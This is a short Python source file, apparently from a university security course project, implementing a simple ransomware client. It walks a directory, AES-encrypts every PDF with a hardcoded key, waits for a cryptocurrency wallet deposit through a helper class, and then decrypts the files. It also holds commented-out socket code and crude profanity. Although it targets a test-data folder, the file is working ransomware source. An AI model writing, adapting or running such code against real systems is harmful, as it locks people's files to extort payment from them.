# client.py
# import socket
from base64 import encode
import os
from util.AES import aes
from util.checkWallet import CheckWallet


a = aes(b'6969696969696969', b'4242424242424242')
def encodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.encrypt(currentFile)
                # print(currentFile)


def decodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.decrypt(currentFile)



path = "../../testing/cosc469-testing-data"
encodeFiles(path)

# CALL LOGAN'S bitch ass modal
print("shit has been encrypted")

cw = CheckWallet()
cw.waitForDeposit()
decodeFiles(path)
print("fixed the shit")


# create a socket object
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# get local machine name
# host = socket.gethostname()

# port = 9999

# connection to hostname on the port.
# s.connect((host, port))

# Receive no more than 1024 bytes
# tm = s.recv(1024)
# print(tm.decode('ascii'))


# s.close()
